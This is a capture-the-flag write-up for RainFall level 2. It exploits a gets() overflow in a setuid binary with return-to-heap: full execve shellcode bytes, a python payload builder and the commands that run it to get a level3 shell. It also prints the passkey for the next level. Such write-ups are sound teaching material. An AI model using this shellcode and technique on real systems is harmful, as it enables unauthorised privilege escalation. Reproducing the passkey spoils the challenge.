# RainFall - Level 2

## Passkey for level3
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02

## Objective

Exploit the `level2` binary (setuid level3) in order to obtain a shell and read the file `/home/user/level3/.pass`.

---

## Binary Analysis

### Disassembly of Function `p`

```gdb
disas p
```

```asm
0x080484d4 <+0>:    push   %ebp
0x080484d5 <+1>:    mov    %esp,%ebp
0x080484d7 <+3>:    sub    $0x68,%esp
...
0x080484e7 <+19>:   lea    -0x4c(%ebp),%eax      ; buffer = ebp-0x4c (76 bytes)
0x080484ed <+25>:   call   0x80483c0 <gets@plt>
0x080484f2 <+30>:   mov    0x4(%ebp),%eax        ; retrieves the return address
0x080484f5 <+33>:   mov    %eax,-0xc(%ebp)
0x080484f8 <+36>:   mov    -0xc(%ebp),%eax
0x080484fb <+39>:   and    $0xb0000000,%eax
0x08048500 <+44>:   cmp    $0xb0000000,%eax
0x08048505 <+49>:   jne    0x8048527 <p+83>      ; if not stack -> continue
...                                              ; otherwise printf + exit
0x08048527 <+83>:   lea    -0x4c(%ebp),%eax
0x0804852d <+89>:   call   0x80483f0 <puts@plt>
0x08048538 <+100>:  call   0x80483e0 <strdup@plt>
0x0804853d <+105>:  leave
0x0804853e <+106>:  ret
```

### Key Points

- A buffer of **76 bytes** (`ebp-0x4c`)
- `gets()` -> buffer overflow possible
- **Filter**: if the return address lies within the stack range (`0xb.......`), the program halts
- After the filter: `puts` then `strdup`
- `strdup` allocates on the **heap** and copies the buffer. The pointer remains in **`%eax`**

### Principal Obstacle

- The stack is non-executable (NX)
- The filter forbids returning onto the stack

It is therefore impossible to place shellcode on the stack and return to it directly.

---

## Solution: Return-to-Heap

### Idea

1. Place shellcode inside the buffer
2. `strdup` automatically copies it onto the heap
3. The pointer to that shellcode sits in `%eax`
4. Find a `call *%eax` gadget within the binary
5. Overwrite the return address with the address of that gadget

### Locating the Gadget

```bash
objdump -d level2 | grep -E "call.*%eax|jmp.*%eax"
```

Result:

```
0x080484cf : call *%eax
```

---

## Building the Payload

### Offset

- Buffer: 76 bytes
- Saved EBP: 4 bytes
- Return address: 4 bytes

-> **80 bytes** to reach the return address.

### Payload Structure

```
[ shellcode (25 bytes) ]
[ padding (51 bytes)   ]
[ fake EBP (4 bytes)   ]
[ gadget  (4 bytes)    ]
```

Total = **84 bytes**

### Shellcode

```asm
xor  %eax, %eax
xor  %edx, %edx          ; edx = 0 (envp must be NULL)
push %eax
push $0x68732f2f         ; "//sh"
push $0x6e69622f         ; "/bin"
mov  %esp, %ebx
push %eax
push %ebx
mov  %esp, %ecx
mov  $0xb, %al
int  $0x80
```

Hexadecimal form:

```
\x31\xc0\x31\xd2\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80
```

### Fake EBP

The `leave` instruction performs:
```asm
mov %ebp, %esp
pop %ebp
```

The saved EBP must therefore be overwritten with a valid stack address, otherwise the stack becomes unusable for the shellcode's `push` operations.

Address used (found via GDB): `0xbffff728`

---

## Final Payload

```bash
python -c 'import sys; sys.stdout.write(
"\x31\xc0\x31\xd2\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" +
"A"*51 +
"\x28\xf7\xff\xbf" +
"\xcf\x84\x04\x08"
)' > /tmp/payload
```

Size check:

```bash
wc -c /tmp/payload
# should show 84
```

---

## Exploitation

```bash
(cat /tmp/payload; cat) | ./level2
```

Once the shell is obtained:

```bash
id
cat /home/user/level3/.pass
```

---

## Verification under GDB

```gdb
gdb ./level2
(gdb) b *0x0804853d
(gdb) run < /tmp/payload

(gdb) print /x $eax          # pointer to the shellcode on the heap
(gdb) x/wx $ebp+4            # should contain 0x080484cf
(gdb) x/20i $eax             # disassembly of the shellcode
(gdb) c
```

---

## Technique Summary

| Step | Description |
|------|-------------|
| 1 | Buffer overflow via `gets` |
| 2 | Shellcode placed at the start of the buffer |
| 3 | `strdup` copies the shellcode onto the heap and puts the pointer in `%eax` |
| 4 | Return address overwritten with `0x080484cf` (`call *%eax`) |
| 5 | Execution of the shellcode -> shell |

This technique is called **return-to-heap**.
